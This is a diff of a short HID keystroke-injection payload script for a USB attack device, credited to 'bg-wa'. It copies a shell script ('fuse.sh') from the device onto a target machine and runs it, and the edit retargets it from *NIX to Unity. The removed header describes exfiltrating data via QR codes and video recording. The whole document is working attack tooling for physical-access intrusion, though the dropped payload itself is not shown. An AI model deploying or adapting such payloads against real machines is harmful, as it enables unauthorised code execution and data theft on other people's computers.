@@ -4,12 +4,10 @@
 # Author:        bg-wa
 # Version:       1.0
 # Category:      HID
-# Target:        *NIX
+# Target:        UNITY
 # Attackmodes:   HID
 #
-# Quick HID only attack to write an HTML/JS file to target machine
-# and open a browser, to exfiltrate data Using QR Codes and a video
-# recording device.
+# Quick HID only attack to write a file to target machine and open
 #
 # | Attack Stage        | Description                              |
 # | ------------------- | ---------------------------------------- |
@@ -21,17 +19,12 @@
 ATTACKMODE HID
 LED SETUP
 
-source_scipt="/root/udisk/payloads/${SWITCH_POSITION}/fuse.sh"
-target_script="~/fuse.sh"
-
-source_html="/root/udisk/payloads/${SWITCH_POSITION}/boom.html"
-target_html="~/boom.html"
+source_script=/root/udisk/payloads/$SWITCH_POSITION/fuse.sh
+target_script=\~/fuse.sh
 
 LED ATTACK
 
-DROP $source_script $target_script
-DROP $source_html $target_html
-RUN LINUX "${target_script}"
+DROP $source_script $target_script true true
+RUN UNITY $target_script
 
-Q ENTER
 LED FINISH
